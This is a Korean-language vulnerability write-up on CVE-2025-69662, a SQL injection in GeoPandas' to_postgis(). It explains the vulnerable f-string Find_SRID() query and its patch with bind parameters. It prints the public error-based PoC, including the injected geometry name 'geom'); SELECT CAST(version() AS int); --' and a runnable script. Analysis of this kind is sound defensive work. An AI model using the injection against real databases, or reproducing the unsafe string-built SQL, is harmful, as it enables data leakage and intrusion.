# GeoPandas `to_postgis()` SQL Injection

> 분석 흐름 도식: [analysis.excalidraw](./analysis.excalidraw)

> [`CVE-2025-69662` · `GHSA-6497-prx7-gpmq`](https://github.com/advisories/GHSA-6497-prx7-gpmq)  
> GeoPandas `< 1.1.2` 영향 · `1.1.2`에서 수정

## GeoPandas와 `to_postgis()`

[GeoPandas](https://geopandas.org/en/stable/about.html)는 Python의 표 처리 라이브러리인 pandas에 지도 데이터를 다루는 기능을 추가한 오픈소스 프로젝트다.

일반적인 pandas 표에는 이름이나 가격 같은 값이 들어간다. GeoPandas의 `GeoDataFrame`에는 여기에 점, 선, 다각형 같은 위치·모양을 저장하는 geometry 열이 추가된다.

```text
매장
┌────┬──────────┬──────────────────┐
│ id │ name     │ geometry         │
├────┼──────────┼──────────────────┤
│ 1  │ 강남점   │ POINT(127.0 37.5)│
└────┴──────────┴──────────────────┘
```

`to_postgis()`는 이렇게 만든 `GeoDataFrame`을 공간 데이터베이스인 PostgreSQL/PostGIS의 테이블로 저장할 때 사용한다.

```python
gdf.to_postgis(
    name="stores",       # 저장할 테이블 이름
    con=engine,          # PostgreSQL 연결
    schema="public",    # 저장할 스키마
    if_exists="append", # 기존 테이블에 행 추가
)
```

`if_exists`에는 다음 동작을 지정할 수 있다.

```text
fail     테이블이 이미 있으면 오류
replace  기존 테이블을 지우고 다시 생성
append   기존 테이블에 데이터 추가
```

## 취약점 요약

GeoPandas의 `to_postgis()`는 공간 데이터를 PostgreSQL/PostGIS에 저장하는 함수다.

기존 테이블에 데이터를 추가할 때는 새 데이터와 기존 테이블의 좌표계가 같은지 확인한다. 이 과정에서 `Find_SRID()`라는 PostGIS 함수를 호출한다.

문제의 SQL에는 다음 세 값이 들어간다.

| 코드의 변수 | 값의 출처 | 정상 예시 |
|---|---|---|
| `schema_name` | `to_postgis(schema=...)`, 생략하면 `public` | `public` |
| `name` | `to_postgis(name=...)` | `test_table` |
| `geom_name` | 현재 GeoDataFrame의 geometry 열 이름 | `geom` |

세 값 모두 f-string으로 SQL에 들어가지만, 공개 PoC는 `geom_name`을 공격 지점으로 사용했다. `geom_name`은 `to_postgis()`의 인자로 직접 전달하는 값이 아니라 다음 코드로 미리 바꾼 geometry 열 이름이다.

`schema_name`과 `name`도 취약한 f-string에 직접 들어가므로 코드 한 줄만 보면 같은 SQL 조작 가능성이 있어 보인다. 그러나 바로 앞의 조건 때문에 `geom_name`과 입력 경로가 다르다.

```python
if connection.dialect.has_table(connection, name, schema):
    # 이 조건이 참일 때만 취약한 Find_SRID() SQL 실행
```

`name`이나 `schema`에 공격 문자열을 넣으면 먼저 `has_table()`이 그 문자열과 같은 이름의 테이블·스키마가 실제로 존재하는지 확인한다. 대부분은 존재하지 않으므로 조건이 거짓이 되어 취약한 SQL까지 도달하지 않는다.

반면 `geom_name`은 `has_table()`의 확인 대상이 아니다. 정상적인 기존 테이블 이름은 그대로 두고 geometry 열 이름만 조작할 수 있어 공개 PoC에 적합하다.

```text
name/schema 조작
    → has_table(조작된 이름)에서 대부분 멈춤

geom_name 조작
    → has_table(정상 테이블 이름)는 참
    → 조작된 geom_name이 Find_SRID() SQL에 도달
```

따라서 세 값의 문자열 조립은 모두 패치 대상이지만, `name`과 `schema`에 공개 PoC를 그대로 옮겨 동일하게 작동한다고 단정할 수는 없다. 조작된 이름과 정확히 일치하는 DB 객체가 이미 존재하는 등의 추가 조건을 별도로 검증해야 한다.

```python
gdf = gdf.rename_geometry("geom")
```

GeoPandas 내부에서는 이 이름을 `gdf.geometry.name`으로 읽어 `geom_name`에 저장한다. 이후 `_write_postgis()`가 `schema_name`, `name`, `geom_name`을 `Find_SRID()` SQL에 넣는다.

```text
gdf.rename_geometry(입력)
    ↓ geometry 열 이름 변경
gdf.geometry.name
    ↓ 내부의 geom_name 변수
_write_postgis(gdf, name, schema, ...)
    ↓
f"SELECT Find_SRID('{schema_name}', '{name}', '{geom_name}');"
    ↓
text(완성된 SQL 문자열)
    ↓
connection.execute(...)
```

여기서 f-string은 Python 문자열 안의 `{변수}`를 현재 값으로 바꾸는 문법이다.

```python
geom_name = "geom"
sql = f"SELECT Find_SRID('public', 'test_table', '{geom_name}');"
```

Python이 만드는 `sql`은 다음과 같은 하나의 문자열이다.

```sql
SELECT Find_SRID('public', 'test_table', 'geom');
```

정상 이름만 들어오면 문제가 없어 보인다. 하지만 f-string은 값이 안전한지 판단하거나 작은따옴표를 처리하지 않고, 받은 문자열을 `{geom_name}` 위치에 그대로 넣는다.

## 정상 기능

다음 코드는 점 하나를 가진 GeoDataFrame을 만든 뒤 geometry 컬럼명을 `geom`으로 변경한다.

```python
import geopandas as gpd
from shapely.geometry import Point

gdf = gpd.GeoDataFrame(
    geometry=[Point(0, 0)],
    crs="EPSG:4326",
)
gdf = gdf.rename_geometry("geom")
```

이 데이터를 기존 `test_table`에 추가하면 GeoPandas는 개념적으로 다음 SQL을 실행해 기존 테이블의 SRID를 확인한다.

```sql
SELECT Find_SRID('public', 'test_table', 'geom');
```

`public`, `test_table`, `geom`은 이 SQL에서 `Find_SRID()`에 전달되는 문자열 값이다.

## 취약한 코드

패치 전 `_write_postgis()`에는 다음 코드가 있었다.

```python
if connection.dialect.has_table(connection, name, schema):
    target_srid = connection.execute(
        text(f"SELECT Find_SRID('{schema_name}', '{name}', '{geom_name}');")
    ).fetchone()[0]
```

여기의 `text()`는 Python 내장 함수가 아니다. `from sqlalchemy import text`로 가져오는 **SQLAlchemy 함수**다.

`text()`는 직접 작성한 SQL 문자열을 SQLAlchemy가 실행할 수 있는 `TextClause` 객체로 만든다.

```python
from sqlalchemy import text

statement = text("SELECT * FROM users")
connection.execute(statement)
```

`text()`는 `:name` 형식의 bind parameter도 지원하지만, 사용한다고 자동으로 문자열 내부의 입력을 분리해 주지는 않는다. 이 취약 코드에서는 `text()`를 호출하기 전에 f-string이 먼저 실행된다.

```text
1. f-string이 schema_name, name, geom_name을 문자열에 삽입
2. 사용자 입력이 포함된 완성 SQL 문자열 생성
3. text()가 그 문자열을 SQL로 취급
4. connection.execute()가 DB에 전달
```

따라서 `text()`를 사용했다는 사실만으로 안전하지 않다. 중요한 것은 사용자 입력을 SQL 문자열에 직접 합쳤는지 여부다.

## 공격 입력과 생성 SQL

공개 PoC는 geometry 컬럼명을 다음과 같이 변경한다.

```python
malicious_name = "geom'); SELECT CAST(version() AS int); --"
gdf = gdf.rename_geometry(malicious_name)
```

이 값이 f-string에 들어가면 다음 형태의 SQL이 만들어진다.

```sql
SELECT Find_SRID(
    'public',
    'test_table',
    'geom'); SELECT CAST(version() AS int); --'
);
```

입력을 세 부분으로 나누면 기존 SQL Injection 강의에서 본 구조와 같다.

```text
geom')                       현재 문자열과 Find_SRID() 호출을 닫음
; SELECT CAST(version() AS int);  새로운 SQL 실행
--                          서버가 뒤에 붙인 문법을 주석 처리
```

`version()`은 PostgreSQL 버전 문자열을 반환한다. 이를 정수인 `int`로 변환하려 하면 오류가 발생하고, 변환하지 못한 원래 문자열이 오류 메시지에 포함된다.

```text
invalid input syntax for type integer: "PostgreSQL 15.4 ..."
```

즉, 이 PoC는 조회 결과를 정상 응답으로 받는 대신 **의도적으로 오류를 발생시켜 오류 메시지에서 정보를 읽는 error-based SQL Injection**이다.

## 공개 PoC의 실행 흐름

```python
import geopandas as gpd
from shapely.geometry import Point

gdf = gpd.GeoDataFrame(
    geometry=[Point(0, 0)],
    crs="EPSG:4326",
)

gdf = gdf.rename_geometry(
    "geom'); SELECT CAST(version() AS int); --"
)

try:
    gdf.to_postgis(
        name="test_table",
        con=engine,
        if_exists="append",
    )
except Exception as error:
    print(error)
```

이 코드는 PostgreSQL/PostGIS가 준비된 허가된 로컬 환경에서만 실행해야 한다. 대상 테이블이 이미 존재해야 취약한 SRID 확인 분기로 들어간다.

## 패치

GeoPandas `1.1.2`에서는 f-string 대신 SQLAlchemy의 bind parameter를 사용하도록 변경했다.

```python
target_srid = connection.execute(
    text(
        "SELECT Find_SRID(:schema_name, :name, :geom_name);"
    ).bindparams(
        schema_name=schema_name,
        name=name,
        geom_name=geom_name,
    )
).fetchone()[0]
```

패치 전에는 SQL과 값이 하나의 문자열이었다.

```text
"SELECT Find_SRID('" + geom_name + "')"
```

패치 후에는 SQL 구조와 값이 분리된다.

```text
SQL 구조: SELECT Find_SRID(:schema_name, :name, :geom_name)
값:       public / test_table / geom_name
```

geometry 컬럼명에 작은따옴표, 세미콜론, 주석 기호가 들어 있어도 SQL 문법으로 해석되지 않고 `Find_SRID()`에 전달할 하나의 값으로 처리된다.

패치 커밋 전체는 테스트와 변경 기록을 포함해 3개 파일 `+262/-1`이다. 실제 취약 코드를 고친 `geopandas/io/sql.py`의 핵심 변경은 `+5/-1`이다.

## 참고 자료

- [GitHub Advisory — GHSA-6497-prx7-gpmq](https://github.com/advisories/GHSA-6497-prx7-gpmq)
- [GeoPandas 패치 커밋](https://github.com/geopandas/geopandas/commit/6aa8ef14ffdee4ba1044349ab948e1a1fbfaf419)
- [발견자의 분석과 공개 PoC](https://aydinnyunus.github.io/2025/12/27/sql-injection-geopandas/)
- [GeoPandas 1.1.2 릴리스](https://github.com/geopandas/geopandas/releases/tag/v1.1.2)
- [GeoPandas 공식 문서 — About](https://geopandas.org/en/stable/about.html)
- [GeoPandas 공식 문서 — `to_postgis()`](https://geopandas.org/en/latest/docs/reference/api/geopandas.GeoDataFrame.to_postgis.html)
- [SQLAlchemy 공식 문서 — `text()`](https://docs.sqlalchemy.org/en/14/core/sqlelement.html#sqlalchemy.sql.expression.text)
